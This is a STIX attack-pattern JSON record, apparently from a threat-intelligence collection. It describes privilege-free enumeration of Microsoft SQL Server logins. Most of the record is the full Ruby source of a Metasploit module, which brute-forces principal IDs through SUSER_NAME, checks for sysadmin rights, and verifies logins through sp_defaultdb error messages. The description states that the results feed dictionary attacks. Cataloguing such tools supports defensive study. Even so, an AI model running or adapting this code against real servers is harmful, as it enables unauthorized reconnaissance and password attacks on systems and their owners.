{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d05136dc-b132-48d0-8f77-6d040dd33ea1",
    "created": "2024-08-14T16:22:29.8998Z",
    "modified": "2024-08-14T16:22:29.899804Z",
    "name": "Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration",
    "description": " This module can be used to obtain a list of all logins from a SQL Server with any login. Selecting all of the logins from the master..syslogins table is restricted to sysadmins. However, logins with the PUBLIC role (everyone) can quickly enumerate all SQL Server logins using the SUSER_SNAME function by fuzzing the principal_id parameter. This is pretty simple, because the principal IDs assigned to logins are incremental.  Once logins have been enumerated they can be verified via sp_defaultdb error analysis. This is important, because not all of the principal IDs resolve to SQL logins (some resolve to roles instead). Once logins have been enumerated, they can be used in dictionary attacks. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/mssql/mssql_enum_sql_logins.rb",
            "external_id": "mssql_enum_sql_logins.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration',\n      'Description' => %q{\n        This module can be used to obtain a list of all logins from a SQL Server with any login.\n        Selecting all of the logins from the master..syslogins table is restricted to sysadmins.\n        However, logins with the PUBLIC role (everyone) can quickly enumerate all SQL Server\n        logins using the SUSER_SNAME function by fuzzing the principal_id parameter. This is\n        pretty simple, because the principal IDs assigned to logins are incremental.  Once logins\n        have been enumerated they can be verified via sp_defaultdb error analysis. This is\n        important, because not all of the principal IDs resolve to SQL logins (some resolve to\n        roles instead). Once logins have been enumerated, they can be used in dictionary attacks.\n      },\n      'Author'      => ['nullbind <scott.sutherland[at]netspi.com>'],\n      'License'     => MSF_LICENSE,\n      'References'  => [['URL','https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql']]\n    ))\n\n    register_options(\n      [\n        OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 300]),\n      ])\n  end\n\n  def run\n    # Check connection and issue initial query\n    print_status(\"Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...\")\n    if mssql_login_datastore\n      print_good('Connected.')\n    else\n      print_error('Login was unsuccessful. Check your credentials.')\n      disconnect\n      return\n    end\n\n    # Query for sysadmin status\n    print_status(\"Checking if #{datastore['USERNAME']} has the sysadmin role...\")\n    user_status = check_sysadmin\n\n    # Check if user has sysadmin role\n    if user_status == 1\n      print_good(\"#{datastore['USERNAME']} is a sysadmin.\")\n    else\n      print_status(\"#{datastore['USERNAME']} is NOT a sysadmin.\")\n    end\n\n    # Get a list if sql server logins using SUSER_NAME()\n    print_status(\"Setup to fuzz #{datastore['FuzzNum']} SQL Server logins.\")\n    print_status('Enumerating logins...')\n    sql_logins_list = get_sql_logins\n    if sql_logins_list.nil? || sql_logins_list.empty?\n      print_error('Sorry, somethings went wrong - SQL Server logins were found.')\n      disconnect\n      return\n    else\n      # Print number of initial logins found\n      print_good(\"#{sql_logins_list.length} initial SQL Server logins were found.\")\n\n      sql_logins_list.sort.each do |sql_login|\n        if datastore['VERBOSE']\n          print_status(\" - #{sql_login}\")\n        end\n      end\n    end\n\n    # Verify the enumerated SQL Logins using sp_defaultdb error ananlysis\n    print_status('Verifying the SQL Server logins...')\n    sql_logins_list_verified = verify_logins(sql_logins_list)\n    if sql_logins_list_verified.nil?\n      print_error('Sorry, no SQL Server logins could be verified.')\n      disconnect\n      return\n    else\n\n      # Display list verified SQL Server logins\n      print_good(\"#{sql_logins_list_verified.length} SQL Server logins were verified:\")\n      sql_logins_list_verified.sort.each do |sql_login|\n          print_status(\" - #{sql_login}\")\n      end\n    end\n\n    disconnect\n  end\n\n  # Checks if user is a sysadmin\n  def check_sysadmin\n    # Setup query to check for sysadmin\n    sql = \"select is_srvrolemember('sysadmin') as IsSysAdmin\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse query results\n    parse_results = result[:rows]\n    status = parse_results[0][0]\n\n    # Return status\n    return status\n  end\n\n  # Gets trusted databases owned by sysadmins\n  def get_sql_logins\n    # Create array to store the sql logins\n    sql_logins = []\n\n    # Fuzz the principal_id parameter passed to the SUSER_NAME function\n    (1..datastore['FuzzNum']).each do |principal_id|\n      # Setup query\n      sql = \"SELECT SUSER_NAME(#{principal_id}) as login\"\n\n      # Execute query\n      result = mssql_query(sql)\n\n      # Parse results\n      parse_results = result[:rows]\n      sql_login = parse_results[0][0]\n\n      # Add to sql server login list\n      sql_logins.push(sql_login) unless sql_logins.include?(sql_login)\n    end\n\n    # Return list of logins\n    sql_logins\n  end\n\n  # Checks if user has the db_owner role\n  def verify_logins(sql_logins_list)\n\n    # Create array for later use\n    verified_sql_logins = []\n\n    fake_db_name = Rex::Text.rand_text_alpha_upper(24)\n\n    # Check if the user has the db_owner role is any databases\n    sql_logins_list.each do |sql_login|\n      # Setup query\n      sql = \"EXEC sp_defaultdb '#{sql_login}', '#{fake_db_name}'\"\n\n      # Execute query\n      result = mssql_query(sql)\n\n      # Parse results\n      parse_results = result[:errors]\n      result = parse_results[0]\n\n      # Check if sid resolved to a sql login\n      if result.include?(fake_db_name)\n        verified_sql_logins.push(sql_login) unless verified_sql_logins.include?(sql_login)\n      end\n\n      # Check if sid resolved to a sql login\n      if result.include?('alter the login')\n        # Add sql server login to verified list\n        verified_sql_logins.push(sql_login) unless verified_sql_logins.include?(sql_login)\n      end\n    end\n\n    verified_sql_logins\n  end\nend\n"
}